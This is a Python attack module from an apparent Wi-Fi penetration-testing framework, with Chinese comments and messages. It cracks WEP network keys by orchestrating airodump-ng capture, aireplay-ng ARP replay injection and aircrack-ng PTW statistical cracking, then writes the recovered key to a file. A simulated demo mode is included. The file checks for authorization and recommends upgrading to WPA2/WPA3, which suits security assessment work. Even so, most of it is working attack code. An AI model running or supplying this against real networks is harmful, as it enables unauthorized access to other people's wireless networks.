"""WEP 攻击：ARP Replay 注入 + PTW 统计破解."""

from __future__ import annotations

import asyncio
import re
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..core.utils import make_run_dir
from ..crack.tools import KEY_FOUND_RE
from ..models import normalize_mac
from ..recon.demo import demo_psk


class WEPAttack(AttackModule):
    id = "wep"
    name = "WEP 破解"
    category = "credential"
    description = (
        "对 WEP 网络执行 ARP Replay 加速 IV 收集，再用 PTW 统计攻击（aircrack-ng -z）恢复密钥。"
        "WEP 已被证明完全不安全，任何 WEP 网络都应在数十分钟内被攻破。"
    )
    requires = ("airodump-ng", "aireplay-ng", "aircrack-ng")
    risk = "critical"
    needs_monitor = True
    options = [
        Option("timeout", "最长运行（秒）", "int", 300, "超时后停止注入并尝试破解"),
        Option("iv_target", "目标 IV 数", "int", 20000, "达到该数量后停止注入"),
        Option("arp_replay", "ARP 重放", "bool", True, "无客户端时可用 Caffe Latte/分片攻击替代"),
    ]

    def validate(self, params: dict) -> list[str]:
        issues = super().validate(params)
        if (params.get("security") or "").upper() != "WEP":
            issues.append("目标不是 WEP 网络（当前模块仅适用于 WEP）")
        return issues

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 0)
        timeout = max(30, int(params.get("timeout") or 300))
        iv_target = max(5000, int(params.get("iv_target") or 20000))
        ctx.authorize("wep", bssid, ssid)
        ctx.emit("attack", f"WEP 攻击：{ssid or '<隐藏>'} · {bssid} · 目标 {iv_target} IVs", bssid=bssid)

        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, started)

        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        run_dir = make_run_dir(ctx.config.run_path, "wep")
        prefix = str(run_dir / "wep")
        dump_proc = await ctx.runner.background(
            ["airodump-ng", "--bssid", bssid, "-c", str(channel), "--write", prefix,
             "--output-format", "pcap,csv", "--write-interval", "1", monitor],
            delay=2.0,
            on_line=lambda line: ctx.log(f"[airodump] {line}"),
        )
        cap_path = Path(prefix + "-01.cap")
        info = await ctx.iface_mgr.info(monitor)
        src_mac = info.mac if info else ""
        replay_proc = None
        if params.get("arp_replay", True) and src_mac:
            replay_cmd = ["aireplay-ng", "-3", "-b", bssid, "-h", src_mac,
                          "--ignore-negative-one", monitor]
            ctx.emit("info", f"启动 ARP Replay：{' '.join(replay_cmd)}")
            replay_proc = await ctx.runner.background(replay_cmd, delay=2.0,
                                                      on_line=lambda line: ctx.log(f"[aireplay] {line}"))
        key: str | None = None
        try:
            waited = 0
            while waited < timeout:
                await asyncio.sleep(5)
                waited += 5
                if not cap_path.exists():
                    continue
                probe = await ctx.runner.run(["aircrack-ng", "-z", "-b", bssid, str(cap_path)], timeout=120)
                match = KEY_FOUND_RE.search(probe.text)
                if match:
                    key = match.group(1)
                    ctx.emit("success", f"WEP 密钥已恢复：{key}")
                    break
                iv_match = re.search(r"(\d+)\s+IV", probe.text)
                if iv_match:
                    ctx.emit("debug", f"已收集 {iv_match.group(1)} IVs…")
        finally:
            await ctx.runner.terminate(replay_proc)
            await ctx.runner.terminate(dump_proc)

        if not cap_path.exists():
            return AttackResult(
                ok=False, summary="未生成抓包文件（检查网卡与信道）", duration=time.time() - started
            )
        capture_id = ctx.register_capture("wep", cap_path, bssid=bssid, ssid=ssid)
        if key:
            key_path = ctx.capture_path("wep", bssid, "txt")
            key_path.write_text(f"SSID: {ssid}\nBSSID: {bssid}\nWEP KEY: {key}\n", encoding="utf-8")
            ctx.register_capture("wep", key_path, bssid=bssid, ssid=ssid, meta={"key": key})
            ctx.finding(
                "WEP 密钥被恢复",
                "critical",
                bssid=bssid,
                ssid=ssid,
                detail=f"WEP Key = {key}；WEP 已无任何安全性，应升级至 WPA2/WPA3。",
                category="wep",
            )
            return AttackResult(
                ok=True,
                summary=f"WEP 破解成功：{key}",
                detail={"key": key, "capture": str(cap_path)},
                capture_id=capture_id,
                duration=time.time() - started,
            )
        return AttackResult(
            ok=False,
            summary="未能在超时内恢复 WEP 密钥（可增大 iv_target 或延长运行时间）",
            detail={"capture": str(cap_path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )

    async def _demo(self, ctx: AttackContext, params: dict, bssid: str, ssid: str, started: float) -> AttackResult:
        key = demo_psk(ssid) or "12345"
        iv = 0
        while iv < 20000:
            iv += 4200
            await asyncio.sleep(0.45)
            ctx.emit("info", f"ARP Replay 注入中… 已收集 {min(iv, 20000)} IVs（模拟）", ivs=min(iv, 20000))
        key_path = ctx.capture_path("wep", bssid, "txt")
        key_path.write_text(f"SSID: {ssid}\nBSSID: {bssid}\nWEP KEY: {key}\n", encoding="utf-8")
        capture_id = ctx.register_capture(
            "wep", key_path, bssid=bssid, ssid=ssid, meta={"demo": True, "key": key}
        )
        ctx.finding(
            "WEP 密钥被恢复（演示）",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail=f"WEP Key = {key}。WEP 的 IV 空间仅 24 位，可在数分钟内被统计攻击攻破。",
            category="wep",
        )
        return AttackResult(
            ok=True,
            summary=f"WEP 破解成功：{key}（模拟）",
            detail={"demo": True, "key": key},
            capture_id=capture_id,
            duration=time.time() - started,
        )
